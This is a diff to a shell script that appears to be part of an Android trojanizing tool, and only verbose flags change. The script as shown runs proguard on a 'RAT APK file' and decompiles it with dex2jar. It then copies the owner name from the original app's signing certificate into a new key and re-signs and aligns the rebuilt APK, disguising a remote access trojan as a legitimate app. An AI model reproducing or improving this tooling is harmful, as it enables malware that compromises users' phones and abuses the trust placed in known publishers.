@@ -233,7 +233,7 @@ echo -n "[*] Running proguard on RAT APK file..."
 mkdir -v -p $MY_PATH/bin/classes >>$LOG_FILE 2>&1
 mkdir -v -p $MY_PATH/libs >>$LOG_FILE 2>&1
 mv $MY_PATH/$RAT_APK_FILE $MY_PATH/bin/classes >>$LOG_FILE 2>&1
-$DEX2JAR $MY_PATH/bin/classes/$RAT_APK_FILE -v -o $MY_PATH/bin/classes/Rat-dex2jar.jar >>$LOG_FILE 2>&1
+$DEX2JAR $MY_PATH/bin/classes/$RAT_APK_FILE -o $MY_PATH/bin/classes/Rat-dex2jar.jar >>$LOG_FILE 2>&1
 rc=$?
 if [ $rc != 0 ]; then
   echo "done."
@@ -477,7 +477,7 @@ dname=`$UNZIP -p $ORIG_APK_FILE $orig_rsa_cert |$KEYTOOL -printcert |grep "Owner
 echo "dname value: $dname" >>$LOG_FILE 2>&1
 
 echo -n "[*] Generating RSA key for signing..."
-$KEYTOOL -genkey -v -noprompt -alias signing.key -dname "$dname" -keystore $keystore -storepass android -keypass android -keyalg RSA -keysize 2048 -validity 10000 >>$LOG_FILE 2>&1
+$KEYTOOL -genkey -noprompt -alias signing.key -dname "$dname" -keystore $keystore -storepass android -keypass android -keyalg RSA -keysize 2048 -validity 10000 >>$LOG_FILE 2>&1
 rc=$?
 echo "done."
 if [ $rc != 0 ]; then
@@ -487,7 +487,7 @@ if [ $rc != 0 ]; then
 fi
 
 echo -n "[*] Signing recompiled APK..."
-$JARSIGNER -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore $keystore -storepass android -keypass android $compiled_apk signing.key >>$LOG_FILE 2>&1
+$JARSIGNER -sigalg SHA1withRSA -digestalg SHA1 -keystore $keystore -storepass android -keypass android $compiled_apk signing.key >>$LOG_FILE 2>&1
 rc=$?
 echo "done."
 if [ $rc != 0 ]; then
@@ -497,7 +497,7 @@ if [ $rc != 0 ]; then
 fi
 
 echo -n "[*] Verifying signed artifacts..."
-$JARSIGNER -verify -verbose -certs $compiled_apk >>$LOG_FILE 2>&1
+$JARSIGNER -verify -certs $compiled_apk >>$LOG_FILE 2>&1
 rc=$?
 echo "done."
 if [ $rc != 0 ]; then
@@ -509,7 +509,7 @@ fi
 mv $compiled_apk $unaligned_apk
 
 echo -n "[*] Aligning recompiled APK..."
-$ZIPALIGN -v 4 $unaligned_apk $compiled_apk >>$LOG_FILE 2>&1
+$ZIPALIGN 4 $unaligned_apk $compiled_apk >>$LOG_FILE 2>&1
 rc=$?
 echo "done."
 if [ $rc != 0 ]; then
